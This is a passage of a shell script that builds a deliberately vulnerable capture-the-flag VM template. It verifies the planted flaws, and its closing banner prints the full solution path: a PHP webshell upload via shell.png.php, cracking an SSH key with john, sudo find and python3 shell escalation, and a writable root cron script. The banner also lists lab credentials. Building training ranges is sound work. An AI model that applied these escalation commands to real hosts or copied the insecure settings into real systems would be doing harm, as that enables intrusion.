  - [ sh, -c, 'cp $DEPLOY_DIR/id_rsa /tmp/bake-nopass; chmod 600 /tmp/bake-nopass; if ssh -q -i /tmp/bake-nopass -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o BatchMode=yes -o IdentitiesOnly=yes -o PasswordAuthentication=no -o ConnectTimeout=10 $SSH_USER@127.0.0.1 id >/dev/null 2>&1; then echo "KEY_ENCRYPTED=no" >> /etc/cybercore-bake.env; else echo "KEY_ENCRYPTED=yes" >> /etc/cybercore-bake.env; fi; rm -f /tmp/bake-nopass' ]

  # END TO END: decrypt a COPY with the passphrase, then SSH in as $SSH_USER.
  # Proves the passphrase is right, the pubkey is installed, sshd accepts an
  # RSA-PEM key on this OpenSSH build, and StrictModes is satisfied. Copy + rm
  # so the shipped key is never modified.
  # IdentitiesOnly + PasswordAuthentication=no so a pass here can ONLY mean the
  # key authenticated — never a silent fallback to $SSH_USER's password.
  - [ sh, -c, 'cp $DEPLOY_DIR/id_rsa /tmp/bake-key; chmod 600 /tmp/bake-key; ssh-keygen -q -p -P "$DEPLOY_KEY_PASSPHRASE" -N "" -f /tmp/bake-key >/dev/null 2>&1; ssh -q -i /tmp/bake-key -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o BatchMode=yes -o IdentitiesOnly=yes -o PasswordAuthentication=no -o ConnectTimeout=10 $SSH_USER@127.0.0.1 id > /tmp/bake-key.out 2>&1; grep -q "$SSH_USER" /tmp/bake-key.out && echo "SSH_KEY_E2E=yes" >> /etc/cybercore-bake.env || echo "SSH_KEY_E2E=no" >> /etc/cybercore-bake.env; rm -f /tmp/bake-key /tmp/bake-key.out' ]

  # Sudoers file parses. A syntax error here breaks sudo for EVERY user on the
  # box, so this is checked before anything that depends on it.
  - [ sh, -c, 'if /usr/sbin/visudo -cf /etc/sudoers.d/fieldops-maint >/dev/null 2>&1; then echo "SUDOERS_VALID=yes" >> /etc/cybercore-bake.env; else echo "SUDOERS_VALID=no" >> /etc/cybercore-bake.env; fi' ]

  # "sudo -l" must LIST the grant without prompting. sudoers' listpw defaults to
  # "any", so NOPASSWD entries are listable password-free; -n makes sudo fail
  # rather than prompt, so a zero exit proves there is no password wall.
  - [ sh, -c, 'if su -s /bin/sh $SSH_USER -c "sudo -n -l" >/dev/null 2>&1; then echo "SUDO_LIST=yes" >> /etc/cybercore-bake.env; else echo "SUDO_LIST=no" >> /etc/cybercore-bake.env; fi' ]

  # EXECUTION tests, not stat tests: actually escalate and confirm uid 0.
  # -n means a password prompt counts as failure, so these prove NOPASSWD works
  # end to end for $SSH_USER.
  - [ sh, -c, 'out=\$(su -s /bin/sh $SSH_USER -c "sudo -n find /etc/hostname -exec id -u \; " 2>&1 | tr -d " \n"); [ "\$out" = "0" ] && echo "SUDO_FIND=yes" >> /etc/cybercore-bake.env || echo "SUDO_FIND=no (\$out)" >> /etc/cybercore-bake.env' ]
  - [ sh, -c, 'printf "import os\nprint(os.geteuid())\n" > /tmp/bake-euid.py; out=\$(su -s /bin/sh $SSH_USER -c "sudo -n python3 /tmp/bake-euid.py" 2>&1 | tr -d " \n"); rm -f /tmp/bake-euid.py; [ "\$out" = "0" ] && echo "SUDO_PYTHON=yes" >> /etc/cybercore-bake.env || echo "SUDO_PYTHON=no (\$out)" >> /etc/cybercore-bake.env' ]

  # NEGATIVE: the gate must hold against saguarobot. Without this the whole
  # point of scoping the grant to %$PRIV_GROUP is unverified — if saguarobot
  # can sudo, the webshell short-circuits straight to root.
  - [ sh, -c, 'if su -s /bin/sh saguarobot -c "sudo -n find /etc/hostname -exec id -u \; " >/dev/null 2>&1; then echo "SUDO_GATED=no" >> /etc/cybercore-bake.env; else echo "SUDO_GATED=yes" >> /etc/cybercore-bake.env; fi' ]

  # NEGATIVE: no stray setuid binaries outside the distro's own set. Catches a
  # leftover /opt/saguaro/bin from an older bake of this template.
  - [ sh, -c, 'n=\$(find /opt /home /usr/local -perm -4000 -type f 2>/dev/null | wc -l); [ "\$n" = "0" ] && echo "NO_STRAY_SUID=yes" >> /etc/cybercore-bake.env || echo "NO_STRAY_SUID=no (\$n)" >> /etc/cybercore-bake.env' ]

  # Cron artifact: present, writable by $SSH_USER, NOT writable by saguarobot.
  - [ sh, -c, 'if [ -f /etc/cron.d/saguaro-fieldsync ] && su -s /bin/sh $SSH_USER -c "test -w /opt/saguaro/field-sync.sh" && ! su -s /bin/sh saguarobot -c "test -w /opt/saguaro/field-sync.sh"; then echo "CRON_ARTIFACT=yes" >> /etc/cybercore-bake.env; else echo "CRON_ARTIFACT=no" >> /etc/cybercore-bake.env; fi' ]

  # Flag CONTAINMENT, not flag content — the files themselves are planted at
  # deploy time by flag-manager.js, so there is nothing to check here yet.
  # What must hold is that a 0644 user.txt dropped into /home/$SSH_USER stays
  # unreadable from the webshell account. Tested for real: write a decoy at the
  # exact mode the planter uses, confirm saguarobot cannot read it, remove it.
  - [ sh, -c, 'printf "%s" "bake-decoy" > /home/$SSH_USER/user.txt; chmod 644 /home/$SSH_USER/user.txt; m=\$(stat -c "%a %U" /home/$SSH_USER); if [ "\$m" = "750 $SSH_USER" ] && ! su -s /bin/sh saguarobot -c "cat /home/$SSH_USER/user.txt" >/dev/null 2>&1; then echo "HOME_PERMS=yes" >> /etc/cybercore-bake.env; else echo "HOME_PERMS=no (\$m)" >> /etc/cybercore-bake.env; fi; rm -f /home/$SSH_USER/user.txt' ]

  # And /root must stay closed to $SSH_USER before escalation, or the root flag
  # is readable straight after the SSH pivot.
  - [ sh, -c, 'if su -s /bin/sh $SSH_USER -c "ls /root" >/dev/null 2>&1; then echo "ROOT_DIR_CLOSED=no" >> /etc/cybercore-bake.env; else echo "ROOT_DIR_CLOSED=yes" >> /etc/cybercore-bake.env; fi' ]

  # Both layers of the cloud-init sudo guard are in place, and saguarobot holds
  # neither the blanket sudoers file nor 'sudo' group membership.
  - [ sh, -c, 'if [ -f /etc/cloud/cloud.cfg.d/99-cybercore-default-user.cfg ] && systemctl is-enabled cybercore-sudo-guard.service >/dev/null 2>&1 && [ ! -e /etc/sudoers.d/90-cloud-init-users ] && ! id -nG saguarobot | grep -qw sudo; then echo "SUDO_GUARD=yes" >> /etc/cybercore-bake.env; else echo "SUDO_GUARD=no" >> /etc/cybercore-bake.env; fi' ]

  # NEGATIVE: saguarobot must hold NO sudo grant whatsoever. Replaces the old
  # SUDO_PYTHON marker — that privesc is gone, superseded by the SSH stage.
  - [ sh, -c, 'if [ -e /etc/sudoers.d/saguarobot-python ] || sudo -l -U saguarobot 2>/dev/null | grep -q NOPASSWD; then echo "SUDOERS_CLEAN=no" >> /etc/cybercore-bake.env; else echo "SUDOERS_CLEAN=yes" >> /etc/cybercore-bake.env; fi' ]

  # Diagnostic only, not asserted: systemd mounts /tmp as nosuid tmpfs on
  # Debian 13, which silently breaks "cp /bin/bash /tmp/rootbash" cron payloads.
  - [ sh, -c, 'echo "TMP_OPTS=\$(findmnt -no OPTIONS /tmp 2>/dev/null | tr -d " " )" >> /etc/cybercore-bake.env' ]

  - [ sh, -c, 'test -e /var/www/cybersaguaros/db && echo "SQL_SRC_REMOVED=no" >> /etc/cybercore-bake.env || echo "SQL_SRC_REMOVED=yes" >> /etc/cybercore-bake.env' ]

  - [ sh, -c, 'echo "BAKE_COMPLETE=yes" >> /etc/cybercore-bake.env' ]

  # ---- Cleanup ----
  # The marker curls above upload through the real intake path, so they
  # leave rows in `uploads` that would list on every lane's Cloud Storage
  # page, and provision.php mints a session token each time it is probed.
  - [ sh, -c, 'mysql cybersaguaros -e "TRUNCATE TABLE uploads; DELETE FROM admin_sessions;" 2>/dev/null || true' ]
  # Drop the clone (token may be in its remote URL) before sealing.
  - [ sh, -c, 'rm -rf /opt/cybersaguaros-src' ]
  - [ sh, -c, 'rm -f /etc/resolv.conf; ln -s ../run/resolvconf/resolv.conf /etc/resolv.conf' ]
  - [ sh, -c, 'cp /var/log/cloud-init-output.log /etc/cybercore-cloud-init.log 2>/dev/null || true' ]
  # Both files describe this machine in full and are readable from the
  # portal's own service account at 0644. The host deletes them outright
  # after verification; 0600 is the fallback for nodes where the verify
  # step is skipped because the disk could not be mapped.
  - [ sh, -c, 'chmod 600 /etc/cybercore-bake.env /etc/cybercore-cloud-init.log 2>/dev/null || true' ]
  - [ sh, -c, 'truncate -s 0 /var/log/nginx/access.log /var/log/nginx/error.log 2>/dev/null || true' ]
  - [ sh, -c, 'rm -f /etc/netplan/50-cloud-init.yaml /etc/network/interfaces.d/50-cloud-init 2>/dev/null || true' ]
  - [ cloud-init, clean, --logs, --seed ]

power_state:
  mode: poweroff
  delay: '+1'
  message: 'CyberSaguaros template bake complete'
  timeout: 1800
SNIPPET

echo "==> Wrote bake snippet: $USERDATA_PATH"

# ---------- 3. Create VM ----------
echo "==> Creating VM $VMID ($NAME)..."
NET0="virtio,bridge=${BAKE_BRIDGE},firewall=0"
[ -n "${BAKE_VLAN:-}" ] && NET0="${NET0},tag=${BAKE_VLAN}"

qm create $VMID \
  --name "$NAME" \
  --memory $MEMORY \
  --cores $CORES \
  --cpu host \
  --machine q35 \
  --bios seabios \
  --scsihw virtio-scsi-pci \
  --net0 "$NET0" \
  --serial0 socket --vga serial0 \
  --agent enabled=1,fstrim_cloned_disks=1 \
  --ostype l26 \
  --description "CyberSaguaros SSRF portal template (nginx+PHP-FPM+MariaDB). Baked from bake-cybersaguaros-template.sh."

echo "==> Importing cloud image as VM disk..."
qm disk import $VMID "$CLOUD_IMG_LOCAL" "$STORAGE"
qm set $VMID --scsi0 "${STORAGE}:vm-${VMID}-disk-0,discard=on,ssd=1"
qm set $VMID --boot order=scsi0
qm resize $VMID scsi0 ${DISK_GB}G || true
qm set $VMID --ide2 "${STORAGE}:cloudinit"

qm set $VMID \
  --ciuser saguarobot \
  --cipassword "$SAGUAROBOT_PASSWORD" \
  --ipconfig0 ip=dhcp \
  --nameserver "$BAKE_DNS" \
  --cicustom "user=${SNIPPET_STORAGE}:snippets/$(basename "$USERDATA_PATH")"

# ---------- 4. Boot + wait ----------
echo "==> Starting VM (cloud-init installs LNMP + the portal; ~8-12 min)..."
qm start $VMID

DEADLINE=$(( $(date +%s) + 1200 ))
while true; do
  STATUS=$(qm status $VMID | awk '{print $2}')
  [ "$STATUS" = "stopped" ] && { echo "==> VM powered off."; break; }
  if [ $(date +%s) -ge $DEADLINE ]; then
    echo "ERROR: cloud-init did not finish in time. Inspect: qm terminal $VMID" >&2
    exit 1
  fi
  sleep 15
done

# ---------- 4b. Pre-seal verification ----------
echo "==> Verifying bake markers..."
VERIFY_DEV=""
case "$STORAGE" in
  *ceph*|vmpool|rbd*)
    VERIFY_DEV=$(rbd map ${STORAGE}/vm-${VMID}-disk-0 --id admin 2>/dev/null) || VERIFY_DEV=""
    ;;
esac

if [ -z "$VERIFY_DEV" ]; then
  echo "WARNING: skipping marker verification (storage '$STORAGE' not a Ceph rbd pool)."
else
  for _ in 1 2 3 4 5; do
    partprobe "$VERIFY_DEV" 2>/dev/null || true
    udevadm settle 2>/dev/null || true
    [ -b "${VERIFY_DEV}p1" ] && break
    sleep 2
  done
  VERIFY_MOUNT=$(mktemp -d)
  if mount -o ro "${VERIFY_DEV}p1" "$VERIFY_MOUNT" 2>/dev/null; then
    BAKE_ENV="$VERIFY_MOUNT/etc/cybercore-bake.env"
    FAIL=0
    if [ -f "$BAKE_ENV" ]; then
      # -F= with an exact key match: the old /^KEY=/ regex also matched KEY2=,
      # and $2 truncated any value that itself contained '='.
      get() { awk -F= -v k="$1" '$1==k {sub(/^[^=]*=/,""); print; exit}' "$BAKE_ENV"; }
      BAKE_COMPLETE=$(get BAKE_COMPLETE)
      APP_SRC=$(get APP_SRC)
      PORT_80=$(get PORT_80_LISTEN)
      SITE_HTTP=$(get SITE_HTTP)
      SSRF_EP=$(get SSRF_ENDPOINT)
      INTERNAL_OK=$(get INTERNAL_OK)
      UPLOAD_EXEC=$(get UPLOAD_EXEC)
      UPLOAD_NOEXEC=$(get UPLOAD_STATIC_NOEXEC)
      UPLOAD_BYPASS=$(get UPLOAD_FILTER_BYPASS)
      UPLOAD_BLOCKS=$(get UPLOAD_FILTER_BLOCKS_NAIVE)
      SQL_SRC_GONE=$(get SQL_SRC_REMOVED)
      XSS_REFLECT=$(get XSS_REFLECT)
      SQLI_EP=$(get SQLI_ENDPOINT)
      DEPLOY_KEY=$(get DEPLOY_KEY)
      KEY_ENCRYPTED=$(get KEY_ENCRYPTED)
      SSH_KEY_E2E=$(get SSH_KEY_E2E)
      M_SUDOERS_VALID=$(get SUDOERS_VALID)
      M_SUDO_LIST=$(get SUDO_LIST)
      M_SUDO_FIND=$(get SUDO_FIND)
      M_SUDO_PY=$(get SUDO_PYTHON)
      M_SUDO_GATED=$(get SUDO_GATED)
      M_NO_STRAY_SUID=$(get NO_STRAY_SUID)
      M_CRON=$(get CRON_ARTIFACT)
      M_HOME_PERMS=$(get HOME_PERMS)
      M_ROOT_DIR=$(get ROOT_DIR_CLOSED)
      SUDO_GUARD=$(get SUDO_GUARD)
      SUDOERS_CLEAN=$(get SUDOERS_CLEAN)
      M_TMP_OPTS=$(get TMP_OPTS)
      echo "    bake complete:        ${BAKE_COMPLETE:-no}"
      echo "    app source found:     ${APP_SRC:-unknown}"
      echo "    :80 listening:        ${PORT_80:-unknown}"
      echo "    site HTTP 200:        ${SITE_HTTP:-unknown}"
      echo "    SSRF endpoint:        ${SSRF_EP:-unknown}"
      echo "    internal API:         ${INTERNAL_OK:-unknown}"
      echo "    uploads exec .php:    ${UPLOAD_EXEC:-unknown}"
      echo "    image ext inert:      ${UPLOAD_NOEXEC:-unknown}"
      echo "    intake filter bypass: ${UPLOAD_BYPASS:-unknown}"
      echo "    intake blocks .php:   ${UPLOAD_BLOCKS:-unknown}"
      echo "    sql source removed:   ${SQL_SRC_GONE:-unknown}"
      echo "    reflected XSS:        ${XSS_REFLECT:-unknown}"
      echo "    SQLi endpoint:        ${SQLI_EP:-unknown}"
      echo "    deploy key readable:  ${DEPLOY_KEY:-unknown}"
      echo "    key needs passphrase: ${KEY_ENCRYPTED:-unknown}"
      echo "    key -> SSH e2e:       ${SSH_KEY_E2E:-unknown}"
      echo "    sudoers file parses:  ${M_SUDOERS_VALID:-unknown}"
      echo "    sudo -l no prompt:    ${M_SUDO_LIST:-unknown}"
      echo "    sudo find -> uid 0:   ${M_SUDO_FIND:-unknown}"
      echo "    sudo python3 -> 0:    ${M_SUDO_PY:-unknown}"
      echo "    gate holds vs bot:    ${M_SUDO_GATED:-unknown}"
      echo "    no stray setuid:      ${M_NO_STRAY_SUID:-unknown}"
      echo "    root cron artifact:   ${M_CRON:-unknown}"
      echo "    home 0750 (flag safe): ${M_HOME_PERMS:-unknown}"
      echo "    /root closed to user: ${M_ROOT_DIR:-unknown}"
      echo "    sudo guard armed:     ${SUDO_GUARD:-unknown}"
      echo "    saguarobot sudo-free: ${SUDOERS_CLEAN:-unknown}"
      echo "    /tmp mount options:   ${M_TMP_OPTS:-unknown}   (nosuid breaks /tmp/rootbash payloads)"
      [ "$BAKE_COMPLETE" != "yes" ] && { echo "ERROR: runcmd did not complete"; FAIL=1; }
      [ "$APP_SRC" != "yes" ]      && { echo "ERROR: '$CHALLENGE_DIR' not found in the clone — challenge source path is wrong"; FAIL=1; }
      [ "$PORT_80" != "yes" ]      && { echo "ERROR: :80 not listening"; FAIL=1; }
      [ "$SITE_HTTP" != "yes" ]    && { echo "ERROR: portal not serving HTTP 200"; FAIL=1; }
      [ "$SSRF_EP" != "yes" ]      && { echo "ERROR: SSRF verify endpoint not responding"; FAIL=1; }
      [ "$INTERNAL_OK" != "yes" ]  && { echo "ERROR: internal provisioning API not working"; FAIL=1; }
      [ "$UPLOAD_EXEC" != "yes" ]  && { echo "ERROR: uploads dir does not execute a .php file (RCE path broken)"; FAIL=1; }
      [ "$UPLOAD_NOEXEC" != "yes" ] && { echo "ERROR: a file ending in an image extension still executes as PHP — the server config is not the stock one this challenge expects"; FAIL=1; }
      [ "$UPLOAD_BYPASS" != "yes" ] && { echo "ERROR: shell.png.php did not survive the Cloud Storage intake filter — the upload stage has no solution"; FAIL=1; }
      [ "$UPLOAD_BLOCKS" != "yes" ] && { echo "ERROR: a bare shell.php was accepted by the intake filter — there is nothing left to bypass"; FAIL=1; }
      [ "$SQL_SRC_GONE" != "yes" ] && { echo "ERROR: /var/www/cybersaguaros/db survived the bake — schema.sql and seed.sql are readable on the box"; FAIL=1; }
      [ "$XSS_REFLECT" != "yes" ]  && { echo "ERROR: /research.php?q= still escapes the payload (reflected XSS missing)"; FAIL=1; }
      [ "$SQLI_EP" != "yes" ]      && { echo "ERROR: /research.php?q= no longer surfaces a SQL error (SQLi regressed)"; FAIL=1; }
      [ "$DEPLOY_KEY" != "yes" ]   && { echo "ERROR: deploy key missing, not encrypted, or unreadable by saguarobot"; FAIL=1; }
      [ "$KEY_ENCRYPTED" != "yes" ] && { echo "ERROR: deploy key authenticates with NO passphrase — the cracking stage is skippable"; FAIL=1; }
      [ "$SSH_KEY_E2E" != "yes" ]  && { echo "ERROR: passphrase/pubkey/sshd mismatch — if OpenSSH rejected RSA-PEM, re-bake with -t ed25519"; FAIL=1; }
      [ "$M_SUDOERS_VALID" != "yes" ] && { echo "ERROR: /etc/sudoers.d/fieldops-maint does not parse — sudo is broken for EVERY user on the box"; FAIL=1; }
      [ "$M_SUDO_LIST" != "yes" ]  && { echo "ERROR: 'sudo -l' as $SSH_USER prompts or fails — the grant is not discoverable"; FAIL=1; }
      [ "$M_SUDO_FIND" != "yes" ]  && { echo "ERROR: 'sudo find' did not run as uid 0 for $SSH_USER"; FAIL=1; }
      [ "$M_SUDO_PY" != "yes" ]    && { echo "ERROR: 'sudo python3' did not run as uid 0 for $SSH_USER"; FAIL=1; }
      [ "$M_SUDO_GATED" != "yes" ] && { echo "ERROR: saguarobot CAN sudo — the webshell short-circuits straight to root"; FAIL=1; }
      [ "$M_NO_STRAY_SUID" != "yes" ] && { echo "ERROR: stray setuid binaries under /opt, /home or /usr/local (leftover from an older bake?)"; FAIL=1; }
      [ "$M_CRON" != "yes" ]       && { echo "ERROR: root cron artifact missing, or writable by the wrong account"; FAIL=1; }
      [ "$M_HOME_PERMS" != "yes" ] && { echo "ERROR: /home/$SSH_USER is not 0750 $SSH_USER, or saguarobot can read a 0644 file inside it — the deploy-planted user flag would be readable from the webshell"; FAIL=1; }
      [ "$M_ROOT_DIR" != "yes" ]   && { echo "ERROR: $SSH_USER can list /root — the deploy-planted root flag is readable without escalation"; FAIL=1; }
      [ "$SUDO_GUARD" != "yes" ]   && { echo "ERROR: cloud-init sudo guard not armed — lane clones will re-grant saguarobot NOPASSWD:ALL"; FAIL=1; }
      [ "$SUDOERS_CLEAN" != "yes" ] && { echo "ERROR: saguarobot still holds a sudo grant — the lateral-movement stage is bypassable"; FAIL=1; }
    else
      echo "ERROR: /etc/cybercore-bake.env not found"
      FAIL=1
    fi

    if [ "$FAIL" = "1" ]; then
      LOG_FILE="$VERIFY_MOUNT/etc/cybercore-cloud-init.log"
      [ -f "$LOG_FILE" ] || LOG_FILE="$VERIFY_MOUNT/var/log/cloud-init-output.log"
      echo ""
      echo "==================================================================="
      echo "  Last 80 lines of cloud-init log inside the VM:"
      echo "==================================================================="
      tail -80 "$LOG_FILE" 2>/dev/null | sed 's/^/    /' || echo "    (no log)"
      umount "$VERIFY_MOUNT"; rmdir "$VERIFY_MOUNT"
      rbd unmap "$VERIFY_DEV" 2>/dev/null || true
      echo ""
      echo "Refusing to seal a broken template. VM $VMID left intact for inspection."
      exit 1
    fi
    # Markers verified, so the marker file has done its job. It and the
    # cloud-init transcript both enumerate what was planted on this box, and
    # both survive into every lane clone, so drop them before sealing.
    if mount -o remount,rw "$VERIFY_MOUNT" 2>/dev/null; then
      rm -f "$VERIFY_MOUNT/etc/cybercore-bake.env" \
            "$VERIFY_MOUNT/etc/cybercore-cloud-init.log"
      sync
      echo "==> Removed bake-time markers and cloud-init transcript from the image."
    else
      echo "WARNING: could not remount rw — /etc/cybercore-bake.env and"
      echo "         /etc/cybercore-cloud-init.log stay on the image (mode 0600)."
    fi
    umount "$VERIFY_MOUNT"
    echo "==> All bake markers OK."
  else
    echo "WARNING: could not mount ${VERIFY_DEV}p1 — skipping verification."
  fi
  rmdir "$VERIFY_MOUNT" 2>/dev/null || true
  rbd unmap "$VERIFY_DEV" 2>/dev/null || true
fi

# ---------- 5. Strip bake-time cloud-init config ----------
echo "==> Clearing bake-time cicustom + cloud-init fields..."
qm set $VMID --delete cicustom
qm set $VMID --delete nameserver 2>/dev/null || true
qm set $VMID --delete searchdomain 2>/dev/null || true
# Drop ciuser/cipassword too. Only `cicustom` used to be stripped, so
# --ciuser saguarobot survived into the template and every lane clone booted on
# Proxmox's generated user-data with `user: saguarobot` + `users: [default]` —
# the trigger for cloud-init's default-user NOPASSWD:ALL grant. With no `user:`
# key there is nothing for that grant to attach to, which backs up the in-guest
# cloud.cfg.d drop-in. saguarobot's password is already baked into the
# template's /etc/shadow via plain_text_passwd, so console login is unaffected.
qm set $VMID --delete ciuser 2>/dev/null || true
qm set $VMID --delete cipassword 2>/dev/null || true

# ---------- 6. Convert to template ----------
echo "==> Converting VM to template..."
qm template $VMID

echo ""
echo "==================================================================="
echo "  CyberSaguaros template $VMID baked successfully"
echo "==================================================================="
echo "  Portal admin:   dr.wagner / arizona"
echo "  Web RCE:        /admin/storage.php accepts any name containing an"
echo "                    image extension -> upload shell.png.php"
echo "                    -> http://<ip>/uploads/shell.png.php"
echo "                    (.phtml and .phar work too; shell.php.png does not)"
echo "  Web foothold:   saguarobot (PHP-FPM pool user) -- NO sudo by design"
echo "  Lateral:        -> $SSH_USER via the world-readable deploy key"
echo "                    $DEPLOY_DIR/id_rsa  (0644, RSA-PEM, passphrase)"
echo "                    named by /opt/saguaro/field-sync.sh"
echo "                    ssh2john id_rsa > k.hash"
echo "                    john --wordlist=rockyou.txt k.hash  -> $DEPLOY_KEY_PASSPHRASE"
echo "                    chmod 600 id_rsa && ssh -i id_rsa $SSH_USER@<ip>"
echo "  User flag:      /home/$SSH_USER/user.txt  (planted at DEPLOY time by"
echo "                    flag-manager.js -- unique per lane, not baked here)"
echo "  Root privesc:   any of these (all gated to group $PRIV_GROUP)"
echo "                    sudo -l          # lists the grant, no password"
echo "                    sudo find . -exec /bin/sh \\; -quit"
echo "                    sudo python3 -c 'import os; os.system(\"/bin/bash\")'"
echo "                    /opt/saguaro/field-sync.sh  (0775 root:$PRIV_GROUP,"
echo "                      run by /etc/cron.d/saguaro-fieldsync every minute)"
echo "  Root flag:      /root/root.txt  (also planted at deploy time)"
echo "  Red herring:    dvalmont / $DVALMONT_PASSWORD  (SSH works, leads nowhere)"
echo "  Off-path:       reflected XSS + SQLi on /research.php?q="
echo "  Instructor:     $SSH_USER / $SSH_PASSWORD (not crackable, console use)"
echo "  Reach via:      http://<lane-subnet>.<ip_octet>/"
echo "  Attach with:   POST /api/admin/lanes/<laneId>/modules"
echo "                 { \"challenge_key\": \"cybersaguaros-ssrf\", \"module\": \"crucible\" }"
echo "==================================================================="
